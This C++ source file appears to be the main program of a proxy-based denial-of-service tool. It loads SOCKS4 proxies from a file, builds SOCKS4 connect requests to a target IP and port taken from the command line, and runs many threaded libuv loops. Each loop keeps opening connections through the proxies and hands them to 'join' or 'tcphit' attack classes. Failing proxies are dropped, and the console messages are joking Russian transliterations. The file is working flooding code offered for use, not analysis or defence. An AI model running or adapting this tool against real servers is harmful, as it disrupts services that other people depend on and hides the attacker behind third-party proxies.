/*
 * All Rights Reserved
 *
 * Copyright (c) 2022 JNNGL
 *
 * Unauthorized copying and/or distributing of this software in source
 * and/or binary forms, via any medium is strictly prohibited
 *
 * Proprietary and confidential
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#include <netinet/in.h>
#include <sys/socket.h>
#include <uv.h>

#include <algorithm>
#include <csignal>
#include <cstring>
#include <fstream>
#include <iostream>
#include <mutex>
#include <random>
#include <sstream>
#include <thread>

#include "attack/attack.h"
#include "attack/join.h"
#include "attack/tcphit.h"
#include "byte_buffer.h"
#include "netutils.h"

std::vector<sockaddr_in*> proxies;
int current = 0;
std::mutex proxyMutex;
std::string proxiesPath;

ByteBuffer proxyConnect;
int protocol;
Attack* attack;

#define CLOSE_CALLBACK [](uv_handle_t* h) {                \
  std::cout << "Дисконнектед фром зе сервер" << std::endl; \
  free(h);                                                 \
}

#define DELETE_GOVNOPROXY                                                                             \
  char ip[22] {};                                                                                     \
  uv_ip4_name((sockaddr_in*) dstAddr, ip, sizeof(ip));                                                \
  std::cerr << "Варнинг!11!! Говнопрокси воз фаунд: " << ip << ":" << dstAddr->sin_port << std::endl; \
  proxyMutex.lock();                                                                                  \
  auto govnoproxy = std::find(proxies.begin(), proxies.end(), dstAddr);                               \
  if (govnoproxy != proxies.end()) {                                                                  \
    proxies.erase(govnoproxy);                                                                        \
    free(dstAddr);                                                                                    \
    if (proxies.empty()) {                                                                            \
      std::cerr << "Олл гивен проксиез ар говнопрокси. Зер ар но мор проксиез" << std::endl;          \
      std::cout << "Релоадинг говнопроксиез" << std::endl;                                            \
      loadProxies();                                                                                  \
    }                                                                                                 \
  }                                                                                                   \
  proxyMutex.unlock();

void loadProxies() {
  std::ifstream proxiesFile(proxiesPath);
  if (!proxiesFile.good()) {
    std::cerr << "Каннот рид проксиес фром файл " << proxiesPath << std::endl;
    exit(-1);
  }
  std::string s;
  while (getline(proxiesFile, s)) {
    std::string proxyIp;
    int proxyPort;
    splitIP(s, proxyIp, proxyPort);

    auto* proxy = (sockaddr_in*) malloc(sizeof(sockaddr_in));
    uv_ip4_addr(proxyIp.c_str(), proxyPort, proxy);
    proxies.push_back(proxy);
  }
  if (proxies.empty()) {
    std::cerr << "Каннот лоад проксиес!! Файл из емпти!" << std::endl;
    exit(-1);
  }
  std::shuffle(std::begin(proxies), std::end(proxies),
               std::default_random_engine {std::random_device {}()});
}

void connect(uv_loop_t* loop) {
  proxyMutex.lock();
  if (current >= proxies.size()) {
    current = 0;
  }
  sockaddr_in* dstAddr = proxies[current++];
  proxyMutex.unlock();

  auto* psock = (uv_tcp_t*) malloc(sizeof(uv_tcp_t));
  uv_tcp_init(loop, psock);

  auto* conn = (uv_connect_t*) malloc(sizeof(uv_connect_t));
  conn->data = dstAddr;
  uv_tcp_connect(conn, psock,
                 (const sockaddr*) dstAddr, [](uv_connect_t* con, int s) {
                   connect(con->handle->loop);

                   auto* dstAddr = (sockaddr_in*) con->data;
                   if (s < 0) {
                     DELETE_GOVNOPROXY
                     return;
                   }
                   //                   std::cout << "Коннектед ту зе сервер" << std::endl;

                   uv_stream_t* stream = con->handle;
                   free(con);

                   write(stream, proxyConnect);
                   stream->data = dstAddr;

                   uv_read_start(
                       stream,
                       [](uv_handle_t*, size_t s, uv_buf_t* b) {
                         *b = uv_buf_init((char*) malloc(s), s);
                       },
                       [](uv_stream_t* stream, ssize_t nread, const uv_buf_t* b) {
                         if (nread < 0) {
                           uv_close((uv_handle_t*) stream, CLOSE_CALLBACK);
                         } else {
                           if (b->base[1] != 90) {
                             std::cerr << "Реквест хас бин режектед бай прокси сервер виз коде " << (int) b->base[1] << std::endl;
                             auto* dstAddr = (sockaddr_in*) stream->data;
                             DELETE_GOVNOPROXY
                             uv_close((uv_handle_t*) stream, CLOSE_CALLBACK);
                           } else {
                             attack->accept(stream, (const sockaddr_in*) stream->data);
                             uv_close((uv_handle_t*) stream, CLOSE_CALLBACK);
                           }
                         }

                         free(b->base);
                       });
                 });
}

int main(int argc, char** argv) {
  if (argc < 5) {
    std::cerr << "Нот энаугхт аргументс!!11!" << std::endl;
    exit(-1);
  }

  proxiesPath = "proxies.txt";
  const int loopCnt = atoi(argv[4]);
  protocol = atoi(argv[3]);

  std::string ip;
  int port;
  splitIP(argv[1], ip, port);

  if (strcmp(argv[2], "join") == 0) {
    attack = new JoinAttack(protocol, ip, port);
  } else if(strcmp(argv[2], "tcphit") == 0) {
    attack = new TcpHitAttack(protocol);
  } else {
    std::cout << argv[2] << " из нот а валид аттак!1!!" << std::endl;
    exit(-1);
  }

  std::cout << ip << " " << port << std::endl;

  loadProxies();
  std::cout << "Лоадед " << proxies.size() << " говнопрксиес" << std::endl;

  /*
   * +----+----+----+----+----+----+----+----+----+----+....+----+
   * | VN | CD | DSTPORT |      DSTIP        | USERID       |NULL|
   * +----+----+----+----+----+----+----+----+----+----+....+----+
   *    1    1      2              4           variable       1
   */

  unsigned short i1, i2, i3, i4;
  sscanf(ip.c_str(), "%hu.%hu.%hu.%hu", &i1, &i2, &i3, &i4);

  proxyConnect.writeByte(4);                 //      VN ; version number
  proxyConnect.writeByte(1);                 //      CD ; command code
  proxyConnect.writeShort((short) port);     // DSTPORT ; port
  proxyConnect.writeByte((unsigned char) i1);//   DSTIP ; ip
  proxyConnect.writeByte((unsigned char) i2);
  proxyConnect.writeByte((unsigned char) i3);
  proxyConnect.writeByte((unsigned char) i4);
  proxyConnect.writeByte(0);//    NULL ; null

  signal(SIGPIPE, SIG_IGN);// Ignore SIGPIPE

  for (int i = 0; i < loopCnt; i++) {
    std::thread([=]() {
      auto* loop = (uv_loop_t*) malloc(sizeof(uv_loop_t));
      uv_loop_init(loop);

      for (int i = 0; i < 4; i++) {
        connect(loop);
      }

      uv_run(loop, UV_RUN_DEFAULT);
      free(loop);
    }).detach();
  }

  while (true)
    ;
}